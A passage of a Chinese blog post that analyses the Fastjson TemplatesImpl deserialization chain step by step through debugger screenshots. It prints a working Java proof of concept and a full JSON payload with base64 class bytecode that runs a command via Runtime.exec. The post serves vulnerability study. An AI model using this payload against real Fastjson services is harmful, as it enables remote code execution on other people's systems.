+<p>此时的输出为：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0f871300306c9def040ce2a9d60ff77f.png" alt="在这里插入图片描述"><br>观察到使用parseObject方法进行反序列化比使用parse方法进行发序列化额外调用了所有的getter方法。这是应为parseObject方法是对parse方法的再一次封装。parse反序列化生成的是一个Object对象，而parseObject却是一个JsonObject对象，正是这个角色的装换使得parseObject多调用了一次所哟逇getter方法。<br>我们的TemplateImpl利用链条也就是利用了parseObject的这一点。我们可以跟一下parseObject方法，最后跟到了：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e64c07bafaec2456193b65a3a30b034c.png" alt="在这里插入图片描述"><br>这个方法首先调用了parse进行反序列化得到一个Object对象，然后是一个三元运算法，判断obj是否是JSONObject的实例，很明显不是的，所以会调用toJSON方法，继续跟到toJSON方法里面：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/c9ad0b9063671b41ca96d2601723db5f.png" alt="在这里插入图片描述"><br>调用了重载方法，继续跟到了这一步：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/20b1cb2630c86569dddb4d26e33d4c6b.png" alt="在这里插入图片描述"><br>此时查看值：</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/0a7c061ea34cc5dfacff44acb6d61e51.png" alt="在这里插入图片描述"><br>发现已经获得了所有的getter，跟到getFieldValuesMap方法里面去：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/47ddde20e74f4158fc36b2fc5714a65a.png" alt="在这里插入图片描述"><br>可以看到age与name的值被取出来了，这里肯定已经调用了getter方法了，看淡上面有个getter.getPorpertyValue方法比较可以，这个应该就是获取值得方法，跟进去：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/102d2742a5cb87d304247b8fe38b58db.png" alt="在这里插入图片描述"><br>果然这里获取到了age的值。<br>从上面的过程来看，parseObject方法在调用的时候会调用toJSON方法将Object类型转换为JSONObject类型，在这个过程中会调用所有的getter方法。这个我们的利用链成立的前提。<br>我满来看一下我们最终利用的payload:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.CannotCompileException;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.util.JavaBeanInfo;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Launcher.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonTemplatesImplPoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">evilCode</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NotFoundException, CannotCompileException &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">aDefault</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> aDefault.get(evilCode.class.getName());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertBefore(s);</span><br><span class="line">        <span class="type">String</span> <span class="variable">RandomClassName</span> <span class="operator">=</span> <span class="string">&quot;armandhe&quot;</span>+System.nanoTime();</span><br><span class="line">        ctClass.setName(RandomClassName);</span><br><span class="line">        ctClass.setSuperclass((aDefault.get(AbstractTranslet.class.getName())));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> Base64.encodeBase64String(bytes);</span><br><span class="line"><span class="comment">//            System.out.println(s1);</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DESERILIZATION_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;\&quot;@type\&quot;:\&quot;&quot;</span> + DESERILIZATION_CLASS +<span class="string">&quot;\&quot;,&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;],&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#x27;_name&#x27;:&#x27;a.b&#x27;,&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#x27;_tfactory&#x27;:&#123; &#125;,&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#x27;_outputProperties&#x27;:&#123; &#125;&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line"><span class="comment">//            System.out.println(jsonString);</span></span><br><span class="line">            <span class="type">ParserConfig</span> <span class="variable">parserConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line"><span class="comment">//            TemplatesImpl templates = new TemplatesImpl();</span></span><br><span class="line"><span class="comment">//            System.out.println(JSON.toJSONString(templates, SerializerFeature.WriteClassName));</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> JSON.parseObject(jsonString, Object.class, parserConfig, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//或者使用下面这个POC</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//import com.sun.org.apache.xalan.internal.xsltc.DOM;</span></span><br><span class="line"><span class="comment">//import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span></span><br><span class="line"><span class="comment">//import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span></span><br><span class="line"><span class="comment">//import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span></span><br><span class="line"><span class="comment">//import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//import java.io.IOException;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//public class Test extends AbstractTranslet &#123;</span></span><br><span class="line"><span class="comment">//    public Test() throws IOException &#123;</span></span><br><span class="line"><span class="comment">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    @Override</span></span><br><span class="line"><span class="comment">//    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) &#123;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    @Override</span></span><br><span class="line"><span class="comment">//    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException &#123;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    public static void main(String[] args) throws Exception &#123;</span></span><br><span class="line"><span class="comment">//        Test t = new Test();</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>核心部分就是jsonString这一部分：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>@type 表示需要将给字符串反序列化为什么类型</li>
+<li>_bytecodes 就是执行命令的payload，其实就是</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Test</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>转换为字节码再进行base64编码</p>
+<ul>
+<li>_name </li>
+<li>_tfactory</li>
+<li>_outputProperties ，这就是我们的漏洞入口了，因为在反序列化过程中调用了该属性的getter方法，即getOutputProperties方法。</li>
+</ul>
+<p>接下来我们跟踪一下这个方法。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f7a1b4cb0394e0312665e69c8aa17559.png" alt="在这里插入图片描述"><br>调用了newTransformer方法，跟进：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a940036dea76980597a5d109b591486b.png" alt="在这里插入图片描述"></p>
+<p>调用getTransletInstance方法，跟进：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/18825b7b412709fa4a714e7676637a18.png" alt="在这里插入图片描述"><br>这里对_name的值进行了判断，不能为空，为空直接return了，而_name的默认值为空：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/dee7b98cf6f97d60ac4fd613d2dddfcd.png" alt="在这里插入图片描述"><br>所以我们构造poc的时候需要为_name赋值。<br>然后要保证_class为null，刚好其默认值就位null，所以我们不用管他，然后就执行了defineTransletClasses方法，这里出现了defineClass类似的关键字，我第一反应就是Java类加载时的defineClass方法，将字节码装换为一个Class实例。想来这各函数和defineClass函数功能一样，我们继续往下看，到了这一步：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e7d839663b4709b41f3c71a44141481c.png" alt="在这里插入图片描述"><br>调用了getConstructor方法然后继续调用了newInstance方法，这是什么？这是通过反射调用构造方法实例化一个对象啊，那么我们只需要将我们的恶意代码卸载恶意类的构造方法里面就好了。这时候就回到了_class[_transletIndex]的值得为一个Class实例对象。且该实例化对象代表的类继承了AbstractTranslet类，因为这儿有个强制类型转换。那么这个_class[_transletIndex]从哪来<br>呢。我们跟进defineTransletClasses方法。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4eeedc02d3106571d951b121eef661da.png" alt="在这里插入图片描述"><br>首先判断了_bytecodes是否为空，这当然是不能为空的了，因为我们会控制他的值，所以接下来流程往下走加载了一个loader，是一个自定义的类加载器，里面应该重写了findclass方法实现了自己的类加载方法，接着往下计算了_bytecodes的长度为classCount，不出意外这里等于1。然后new了一个Class数组赋值给_class。然后判断classCount的值是否大于1，当然是不大于了，然后进入for循环，把第一个字节数据取出来调用defineClass方法生成一个Class实例对象。然后获取该Class对象的父类，判断其是否等于ABSTRACT_TRANSLET，这个常量的值我们跟一下：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/37cde3d936f2a5017a4c3d0c9a1b4f26.png" alt="在这里插入图片描述"><br>正好是AbstractTranslet类，和我们上面分析的一致，我们需要让我们的恶意类集成AbstractTranslet类。然后为_transleetIndex复赋值为0。defineTranslet调用完毕后就是实例化对象执行构造方法了。</p>
+<p>但是这里有一个疑问，我们传给_bytecodes的代码是base64编码的，那么在执行过程中，肯定有哪一步实现了解码的操作，这个我们要从头开始看。<br>我们的poc中使用的反序列化函数是这个：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/2506c24576472c96e0251e20ebe6eb1e.png" alt="在这里插入图片描述"><br>其中jsonString就是我们穿进去的payload，我们跟一下这个parseObject方法：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f063a10dc4a3a989c771b7202d472fe8.png" alt="在这里插入图片描述"><br>调用了重载方法，继续跟：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/21be525054f6eacbb38b83131c73b952.png" alt="在这里插入图片描述"></p>
+<p>跟到了这里注意有两个关键的地方，一个是第一个箭头处生成了一个JSON解析器对象，一个是第二个箭头处调用的parseObject方法，我们先跟第二个箭头：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/679d84dab4f64ffc90b42c06ba0f635b.png" alt="在这里插入图片描述"><br>进去后看到又一个token的判断，这个后面再将，最后到调用getDeserializer方法，获取一个反序列化器，然后调用其deerialze方法，跟到方法里面：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a08f58da592247915b64ee616dfc21e6.png" alt="在这里插入图片描述"><br>注意到最后return处的三元运算符，判断type是否为Class实例，并且不是Object.Class实例，并且不是Serializable.Class实例，这个判断为否，所以最后执行了parser.parser方法，跟进去：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e464c93696f3b3b0857384cd5d1f3be5.png" alt="在这里插入图片描述"><br>这里有大块的语句对lexer.token的值尽心判断，那么这个值为多少呢？我们需要回到前面的步骤：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a4c70ef479481c8497a1ad8c5093c84c.png" alt="在这里插入图片描述"><br>跟进这个新建解析器的操作：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/97befd5b67a280e376c3346558e06c0c.png" alt="在这里插入图片描述"><br>调用了构造方法：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4fb8bbf9a4cbf45602511d6cfac43106.png" alt="在这里插入图片描述"><br>this.lexer在这儿被赋值，形参lexer是一个JSONScanner对象由上一步传进来。然后执行lexer.getcurrent方法，看看他干了什么：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f42e03f693cc4efbfc16f5b6fb6bdd48.png" alt="在这里插入图片描述"><br>反回了this.ch的值，这个值当前为{ 看看这个值怎么获取的，该值是在创建JSONScanner对象时再构造方法中赋值的，跟进去：</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/afe015a247f576402a14867fe2a58e19.png" alt="在这里插入图片描述"><br>继续跟到this.next里面:<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7e721ed2548ac42df0d2e96570444dfd.png" alt="在这里插入图片描述"><br>这里看到有一个三元运算符，如果当前的index大于this.len则为this.ch赋值为\u001a，否则计算this.text在index处的字符赋值给this.ch。this.len 与 this.text在上一级函数赋值，分别为input与input的长度，而input就是我们的输入的pauload。所以最开始获取到的this.ch为 { 后面每调用一次this.getcurrent就是调用一次this.next获取下一个字符的值，这时候我们返回到getcurrent的调用处：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ecb5ba3b4262d1036a53ec92d6d5357f.png" alt="在这里插入图片描述"></p>
+<p>ch &#x3D;&#x3D;‘{’成立，然后获取下一个字符，并把token设置为12。<br>以上就是token的由来，然后我们回到parse函数，找到case 12：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/c80db5f1bc10df5d5d7b112bb9ab0636.png" alt="在这里插入图片描述"><br>跟到this.parseObject里面：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/6b132329d9a05c2df08cc4e075cc9b67.png" alt="在这里插入图片描述"><br>一步步调试最后到了第二个红箭头处，判断第二个ch是否为” ,当然是的，我们让调试过程强制跳转到第176行：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3d5c85e5f6fbb39267499e1d386e64da.png" alt="在这里插入图片描述"><br>这里获取了key的值，但是我们不知道是多少，再前进一步：</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/419ec316e45994ee75282e83ef275758.png" alt="在这里插入图片描述"><br>这不就有了吗，key就是@type，继续单步往下走就到了这儿：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/23da7cbb241829c5c2aaca5ca2465275.png" alt="在这里插入图片描述"><br>判断key是否等于JSON.DEFAULT_TYPE_KEY，看看这个常量是多少：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/1e01dda8b1c061a4fce244eaab0bb788.png" alt="在这里插入图片描述"><br>证明是相等的。第二个条件就不跟了。然后进入到if判断里面获取了ref，走到他的下一步看看ref等于多少，不幸的是，调试的时候没看到，那只能去看看lexer.scanSymbol干了什么了，这个和获取key值得方法一样，我猜就是获取@type的值：<br>没跟到，哈哈尴尬！！！！！直接跳过，范湖IDE就是@type的值：<br>然后就调用了loadClass函数，这个…..，不就是要准备加载类了吗，我们进去看看：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/13c3654464cee3c403c0a1227a229ffe.png" alt="在这里插入图片描述"><br>果然，第一个参数是类名，第二个参数是类加载器，我们传进来的是默认类加载器也就是系统类加载器。首先判断clazz是否为空，当然不为空，然后判断类名第一个字符是否是[，当然也不是，然后判断是否以L开头，当然也不是，都不是之后判断类加载器是否为空，当然不是，然后调用系统类加载器的loadClass方法加载了我们的恶意TemplataImpl类并返回。到这里我们就获得了TemplateImpl类的Class实例对象了。然后就是通过反射机制获得类名、字段之类的一系列值了。然后单步向下来到这里：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/9f73cac0c741f9b7a555c7727aa9890f.png" alt="在这里插入图片描述"><br>跟进去：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/54fc5f878379efa07b945d4ab82e8366.png" alt="在这里插入图片描述"></p>
+<p>调用重载方法，继续跟：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/c6b127bec0b43f2432ab9716db80349a.png" alt="在这里插入图片描述"><br>还是重载，继续：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0b6053e5d2e6ba965c51337978ba4982.png" alt="在这里插入图片描述"><br>然后来到了这里，单步向下到这里：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/dfc7531499a7428d38c9c68857ed7f7d.png" alt="在这里插入图片描述"></p>
+<p>到367行已经获取到了outputProperities的值了<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b72d99e660b80bcfe797a6e6b73468cc.png" alt="在这里插入图片描述"><br>看看他怎么来的，最后定位到底63行，在构造方法中被赋值：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/62a76338ff33d2d8182905a2475a49ce.png" alt="在这里插入图片描述"><br>那就看看在哪创建的吧，返回到上一层，当然是在这儿：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d1342d5949c6380b5bfdc33abfabcb23.png" alt="在这里插入图片描述"><br>进到getDeserializer方法里面：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/84d5091d7fb87ddd235d21d8ee9fa7b2.png" alt="在这里插入图片描述"><br>跟进这一步，单步到这儿：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3a3a70dd76788ffe1f9496e814d1c5da.png" alt="在这里插入图片描述"><br>继续跟进去，定位到这儿：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5a3b8cb3c6aadb5a6cccbff31a0be4e9.png" alt="在这里插入图片描述"><br>继续跟进去：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/6e91952f5d4c63dcada2109957040447.png" alt="在这里插入图片描述"></p>
+<p>这里获取了所有的属性与方法，继续向下到这儿：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/50f3c6e52debaacd230984e5f166a384.png" alt="在这里插入图片描述"><br>判断方法名是否长度大于4，因为有get与set嘛，不能是静态方法，返回值不能为void，或者返回值为自身的类，继续向下判断是否set开头。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/16fef496cf1fc4b119efb2eb7b3b668a.png" alt="在这里插入图片描述"><br>这个最后有一个add方法获得了所有的属性放到fieldList里面<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7f7989d251cb1a7d61acc64a89fa6735.png" alt="在这里插入图片描述"><br>通过同样的方法获得get方法的属性：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7b646c4806f06aad7cfadc5270791a03.png" alt="在这里插入图片描述"><br>最终返回一个JavaBeanInfo对象，里面就有outputProperties则值了：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ec5fcba7df48c9af84f46331892f8dc4.png" alt="在这里插入图片描述"><br>然后继续向下：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/dca9c0ffd21e2e2c7835c0d0c2cb313d.png" alt="在这里插入图片描述"><br>跟进去：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ae9ee75446203cd8576d24a42b85704e.png" alt="在这里插入图片描述"><br>继续跟：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a0d24d9b5d3bf931ef0b112c6bce3570.png" alt="在这里插入图片描述"><br>到这儿后，判断_bytecodes第一个字符是不是_，如果是则替换为空，到最后返回一个fieldDeserializer：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/822d25190bc4b113d757a827db2f4e4b.png" alt="在这里插入图片描述"><br>执行完后到这儿，反正我是没有跳过去：<br><img 